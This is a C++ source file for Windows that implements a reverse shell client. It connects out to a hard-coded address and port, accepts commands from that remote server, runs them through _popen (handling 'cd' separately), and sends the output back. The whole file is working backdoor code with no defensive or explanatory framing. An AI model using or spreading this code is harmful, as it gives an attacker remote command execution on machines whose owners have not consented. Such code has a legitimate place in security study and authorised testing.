#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <stdio.h>
using namespace std;

#define PORT 15246
#define BUFFERSIZE 256
#define SEND 0
#define RECV 1
#define ERROR -1
#define SUCCESS 0

int connect_to_server(const char* addr);
void recv_from_server(int fd);
int receipt_confirmation(int sock,int check);

int main()
{
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0), &WSAData);
    connect_to_server("192.168.1.27");
    WSACleanup();
    return 0;
}


int connect_to_server(const char* addr)
{
    int sock;
    struct sockaddr_in server;

    sock = socket(PF_INET,SOCK_STREAM,0);
    if(sock==-1)
    {
        std::cout<<"Error while creating socket..."<<std::endl;
        return -1;
    }

    memset(&server, 0,sizeof(server));
    server.sin_family = PF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = inet_addr(addr);

    if (connect(sock,(const struct sockaddr*)&server,sizeof(server))!= 0)
    {
        std::cout<<"Error connecting socket..."<<std::endl;
        return -1;
    }

    recv_from_server(sock);

    closesocket(sock);
    return 0;

}

void recv_from_server(int fd)
{
    const char prompt[]="$";
    const char quit_str[] ="quit: result";
    char str[BUFFERSIZE];
    ssize_t len;
    FILE *fp;
    while(1)
    {

        len = send(fd,prompt,strlen(prompt),0);
        if(len==-1)
        {
            std::cerr<<"Error send prompt"<<std::endl;
            return;
        }

        len = recv(fd,str,sizeof(str)-1,0);
        if(len>0)
        {
            str[len-1]='\0';
        }else{
            std::cerr<<"Error recv socket"<<std::endl;
            return;
        }
        std::cout<<"commande recue : "<<str<<std::endl;
        if(str[0]=='c'&&str[1]=='d')
        {
            chdir(str+3);
        }else{
            fp = _popen(str,"r");
            if(fp)
            {
                while(fgets(str,BUFFERSIZE,fp)!=NULL)
                {
                    len = send(fd,str,sizeof(str)-1,0);
                    if(len == -1)
                    {
                        std::cerr<<"Error send command result"<<std::endl;
                    }
                    if( receipt_confirmation(fd ,RECV)== ERROR)
                    {
                        std::cerr<<"Error receipt confirmation"<<std::endl;
                        return;
                    }

                }
                fclose(fp);
            }
        }

        len = send(fd,quit_str,strlen(quit_str),0);
        if(len==-1)
        {
            std::cerr<<"Error quit str"<<std::endl;
            return;
        }

        if( receipt_confirmation(fd ,RECV)== ERROR)
        {
            std::cerr<<"Error receipt confirmation"<<std::endl;
            return;
        }
    }
    return;
}

int receipt_confirmation(int sock,int check)
{
    ssize_t len;

    if(check == RECV)
    {
        char str[3];
        len = recv(sock,str,sizeof(str)-1,0);
        if ( len > 0){
            str[len]='\0';

            if ( strcmp(str,"OK"))
            {
                return ERROR;
            }
        }else{
            std::cerr<<"Error recv ok"<<std::endl;
            return ERROR;
        }
    }else{
        char str[] = "OK";

        len = send(sock,str,strlen(str),0);
        if ( len == -1 )
        {
            std::cerr<<"Error send ok"<<std::endl;
            return ERROR;
        }
    }

    return SUCCESS;
}
